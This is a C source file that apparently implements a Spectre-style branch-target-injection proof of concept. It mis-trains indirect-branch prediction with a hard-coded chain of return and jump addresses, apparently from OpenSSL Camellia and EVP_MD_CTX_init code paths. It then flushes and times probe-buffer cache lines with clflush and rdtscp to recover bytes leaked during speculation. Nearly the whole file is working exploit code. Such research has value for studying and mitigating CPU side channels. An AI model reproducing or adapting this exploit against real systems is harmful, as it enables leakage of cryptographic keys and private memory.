#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include "common.h"

// Defines the bandwidth we can communicate
// from speculative -> von neuman
// e.g. 256 would be 1 byte of info
// Tradeoff here is larger bandwidth means we have
// to check more places in probe_buf (and flush them)
#define NUM_PROBES 256
#define DECRYPT_LEN 256

// These define the stride length we take between probes
// This thwarts a clever CPU's stride prediction
// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
// Generally, this results in not seeing ANY winning probes
// in which case, we change cur_probe_space and retry
#define MAX_PROBE_SPACE (1000003)
double avgpct = 0;
uint64_t cur_probe_space = 4177;


// The (heap-allocated) probe buffer
// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
// in the cache to communicate the value i from speculative -> von neuman
uint8_t *probe_buf;


// This is a simple counter, accessed by the speculative function (target_fn)
// so it can compute on it.
uint16_t signal_idx = 0;
uint64_t instr = 0;


// Stats
uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
uint64_t tot_time = 0;      // Number cycles total

unsigned int junk=0;    // For rdtscp


void *map;
#define TARGET_FN_ADDR 0x414100401000



typedef struct jump_st {
    uint64_t from;
    uint64_t to;
} jump;

#define PAGE_SIZE 0x1000
#define MAX_PAGES 100
#define NUM_JUMPS 31


inline void call(void *fn_ptr) __attribute__((always_inline));
void call(void* fn_ptr) {
    asm volatile ("jmpq *%%rax\n" :: "a"(fn_ptr) :);
}

inline void push(uint64_t val) __attribute__((always_inline));
void push(uint64_t val) {
    asm volatile ("push %%rax\n" :: "a"(val):);
}


uint64_t loaded_pages[MAX_PAGES];
int loaded_pages_idx = 0;
jump jump_addrs[NUM_JUMPS] = {
        // CAMELLIA256-SHA / EVP_MD_CTX_init...
        {0x7ffff780d32d, 0x7ffff780d3ff}, //  retq   
        {0x7ffff788a28b, 0x7ffff788a3b1}, //  retq   
        {0x7ffff77fedad, 0x7ffff77fe8f0}, //  callq  *0x36d5f5(%rip)        # 0x7ffff7b6c3a8
        {0x7ffff77fe8f7, 0x7ffff7458a80}, //  jmpq   *%rax
        {0x7ffff745687e, 0x7ffff7458ae0}, //  retq   
        {0x7ffff7458b29, 0x7ffff77fedb3}, //  retq   
        {0x7ffff77fede3, 0x7ffff788a513}, //  retq   
        {0x7ffff77fdb40, 0x7ffff7470a30}, //  jmpq   *0x36e68a(%rip)        # 0x7ffff7b6c1d0
        {0x7ffff7470a71, 0x7ffff788a40a}, //  retq   
        {0x7ffff788a495, 0x7ffff780cc39}, //  retq   
        {0x7ffff788a28b, 0x7ffff788a3b1}, //  retq   
        {0x7ffff77fedad, 0x7ffff77fe8f0}, //  callq  *0x36d5f5(%rip)        # 0x7ffff7b6c3a8
        {0x7ffff77fe8f7, 0x7ffff7458a80}, //  jmpq   *%rax
        {0x7ffff745687e, 0x7ffff7458ae0}, //  retq   
        {0x7ffff7458b29, 0x7ffff77fedb3}, //  retq   
        {0x7ffff77fede3, 0x7ffff788a513}, //  retq   
        {0x7ffff77fdb40, 0x7ffff7470a30}, //  jmpq   *0x36e68a(%rip)        # 0x7ffff7b6c1d0
        {0x7ffff7470a71, 0x7ffff788a40a}, //  retq   
        {0x7ffff788a495, 0x7ffff780cc5d}, //  retq   
        {0x7ffff788a28b, 0x7ffff788a3b1}, //  retq   
        {0x7ffff77fedad, 0x7ffff77fe8f0}, //  callq  *0x36d5f5(%rip)        # 0x7ffff7b6c3a8
        {0x7ffff77fe8f7, 0x7ffff7458a80}, //  jmpq   *%rax
        {0x7ffff745687e, 0x7ffff7458ae0}, //  retq   
        {0x7ffff7458b29, 0x7ffff77fedb3}, //  retq   
        {0x7ffff77fede3, 0x7ffff788a513}, //  retq   
        {0x7ffff77fdb40, 0x7ffff7470a30}, //  jmpq   *0x36e68a(%rip)        # 0x7ffff7b6c1d0
        {0x7ffff7470a71, 0x7ffff788a40a}, //  retq   
        {0x7ffff788a495, 0x7ffff780cc6e}, //  retq   
        {0x7ffff780cc45, 0x7ffff780d437}, //  retq   
        {0x7ffff780d407, 0x7ffff789730b}, //  retq   
        {0x7ffff7897318, 0x7ffff788a420}, //  retq  
    };


void load_page(uint64_t addr)
{
    uint64_t page = addr & ~(PAGE_SIZE-1);
    int i;
    for (i=0; i<loaded_pages_idx; i++) {
        if (loaded_pages[i] == page) {
            // Already loaded
            return;
        }
    }
    loaded_pages[loaded_pages_idx++] = page;

    void *map = mmap((void*)page, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    if (map == ((void*)-1)) {
        printf("Error mapping %lx (page %lx):\n", addr, page);
        perror("mmap");
        exit(-1);
    }
    printf("Mapped %p -> %p\n", (void*)page, map);

    // Fill with returns:
    memset(map, '\xc3', PAGE_SIZE);
}





// We define this function in assembly (target_fn.S)
// It is never called directly (essentially dead code)
// However, indirect.c trains the processor to think the indirect
// jump in common.c::indirect() is going to call this function
// We flush the fn_ptr used by indirect(), forcing the CPU to
// (mis)speculate and start processing this function.
// In reality, the CPU will (eventually) call check_probes()
// where we collect results and see what's in cache
void target_fn(void) __attribute__((section(".targetfn")));
void end_target_fn(void);

uint64_t results[NUM_PROBES];

void check_probes() {
    // Because indirect_camellia pushed rbx and rbp,
    // we have to pop them here to restore the stack
    // (and then we re-push them...)
    asm volatile("pop %%rbx\n"
            "pop %%rbp\n" :::);

    uint64_t t0, t1;
    uint8_t *addr;

    int i;
    for (i=0; i<NUM_PROBES; i++) {
        addr = &probe_buf[i*cur_probe_space];
        t0 = _rdtscp(&junk);
        asm volatile( "movb (%%rbx), %%al\n"
            :: "b"(addr) : "rax");
        t1 = _rdtscp(&junk);
        if (t1-t0 < 140) {
            cache_hits++;
            tot_time += t1-t0;
            results[i]++;
            //printf("# %lu\n", t1-t0);
            //_mm_clflush(addr);
        }
    }
    tot_runs++;

    // Clear probe_buf from cache
    for (i=0; i<NUM_PROBES; i++) {
        _mm_clflush(&probe_buf[i*cur_probe_space]);
    }
}

uint64_t jmp_ptr;



void indirect_camellia(register uint64_t *jmp_ptr) {

    // First, push where we want to come back to:
    // Note: check_probes will do a normal return,
    // but it's never called (it's returned into
    // after the speculative head fake).
    // That's ok, because this function's return address
    // will be on the stack, and check_probes() will
    // consume it.
    register int i;
    //void *ret = check_probes;
    //push((uint64_t)ret);

    // To test:
    // Maybe we want a cached-copy of this value?
    //push((uint64_t)fn_ptr);
    asm volatile ("push %%rax\n" :: "a"(fn_ptr):);

    for (i=NUM_JUMPS-2; i>=0; i--) {
        //push(jump_addrs[i].to);
        //register addr;
        asm volatile ("push %%rax\n" :: "a"(jump_addrs[i].to):);
    }

    // Do something slow to stall the pipeline???
    // Call the first thing in the jump chain
    //call((void (*)(void))jump_addrs[0].from);
    asm volatile ("add (%%rbx), %%rax\n"
            "jmpq *%%rax\n" :: "a"(jump_addrs[0].from), "b"(jmp_ptr):);


    // This code won't execute...our ROP chain
    // will end up retrurning from indirect_camellia()
}



void measure() {
    fn_ptr = check_probes;
    //jmp_ptr = 0x400e60;
    jmp_ptr = 0;
    int i;

    int misses = 0;
    uint64_t last_i = 0xff;

    while (1) {
        for (i=0; i<2000; i++) {
            _mm_clflush(&fn_ptr);
            //_mm_clflush(&jmp_ptr);
            //indirect(&jmp_ptr);
            indirect_camellia(&jmp_ptr);
            //((void(*)(void *))map)(&jmp_ptr);
            usleep(1);
        }
        uint64_t avg = 0;
        if (cache_hits > 0) avg = tot_time/cache_hits;

        uint64_t max_res=0, max_i=0;
        for (i=0; i<NUM_PROBES; i++) {
            if (results[i]>max_res) {
                max_res = results[i];
                max_i = i;
            }
        }

        if (max_res > 10 && avg < 50){
            printf("[%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld, #%03d, %d misses\n",
                     max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space, signal_idx, misses);
            avgpct += ((float)max_res)/tot_runs;

            if (max_i != ((last_i + 1)&0xff)) {
                printf("---- ERROR: ^^^^^^^^^\n");
                exit(-1);
            }
            last_i = max_i;
            signal_idx++;
            instr++;
            misses = 0;
            if (signal_idx > DECRYPT_LEN) {
                avgpct /= DECRYPT_LEN;
                avgpct *= 100;
                printf("total avg hit rate = %0.5f%%\n", avgpct);
                exit(0);
            }

        } else {
             printf("--[%lu]: %lu, %lu avg cycles ps %ld\n", max_i, max_res, avg, cur_probe_space);
            misses++;
            cur_probe_space += 63;
            cur_probe_space %= MAX_PROBE_SPACE;
        }
        cache_hits = 0;
        tot_runs = 0;
        tot_time = 0;

        memset(results, 0, sizeof(uint64_t)*NUM_PROBES);
        //signal_idx %= NUM_PROBES;
        usleep(10);
    }


}

int main()
{
    probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
    if (probe_buf == NULL) {
        perror("malloc");
        return -1;
    }

    printf("probe_buf @%p\n", probe_buf);
    int i =0;
    for (i=0; i<NUM_PROBES; i++) {
        memset(&probe_buf[i*MAX_PROBE_SPACE], i, MAX_PROBE_SPACE);
        _mm_clflush(&probe_buf[i*cur_probe_space]);
    }

   // Setup of OpenSSL Camellia EVP_MD_CTX_init jumps
    memset(loaded_pages, 0, sizeof(uint64_t)*MAX_PAGES);
    for (i=0; i<NUM_JUMPS-1; i++) {
        load_page(jump_addrs[i].from);
        load_page(jump_addrs[i].to);

        // Write the jump from this .to to  the next .from
        // get difference - 5 (len(jmpq $xxxx) instruction)
        uint8_t *p = (uint8_t*)(jump_addrs[i].to);
        int32_t diff = jump_addrs[i+1].from - jump_addrs[i].to;
        if (diff > 0 && diff < 5) {
            // Fill with nops instead
            // a jmpq instruction would overwrite the next
            // retq byte...
            memset(p, '\x90', diff);
        } else {
            // Fill with a jump
            *p++ = 0xe9; // jumpq
            int32_t from = diff - 5;
            memcpy(p, &from, 4);
        }
    }


    // Copy the target_fn code into the last jump_addrs[NUM_JUMPS-1].to
    // This will hopefully be speculatively called...
    // HACK: we are a few bytes over, and overwrite a value that should be a ret..
    // but the last 6 bytes of target_fn aren't needed, sooo...
    memcpy((void*)jump_addrs[NUM_JUMPS-1].to, target_fn, end_target_fn-target_fn - 6);



    /*
    map = mmap((void*)TARGET_FN_ADDR, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    memcpy(map, indirect, ((uint64_t)end_indirect)-((uint64_t)indirect));
    memcpy(map+600, target_fn, end_target_fn-target_fn);

    */
    fn_ptr = check_probes;
    measure();

}
